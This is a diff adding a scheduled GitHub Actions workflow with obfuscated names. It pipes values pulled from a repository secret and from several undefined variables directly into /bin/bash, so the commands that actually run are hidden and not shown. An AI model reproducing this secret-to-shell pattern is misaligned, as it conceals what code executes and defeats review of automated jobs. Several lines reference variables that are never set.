@@ -1,0 +1,24 @@
+name: wachuangdididishi
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '27 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: wachuangdididishi
+        env:
+          auda76: ${{ secrets.auda76 }}
+        run: |
+          echo $auda76 | jq -r .n67303 | /bin/bash
+          echo $de52468 | jq -r .lxwx6 | /bin/bash
+          echo $gm34 | jq -r .j888 | /bin/bash
+          echo $vx21857 | jq -r .rn39 | /bin/bash
+          echo $l36 | jq -r .dkezp57622 | /bin/bash
+          echo $n82 | jq -r .ziarr616 | /bin/bash
+
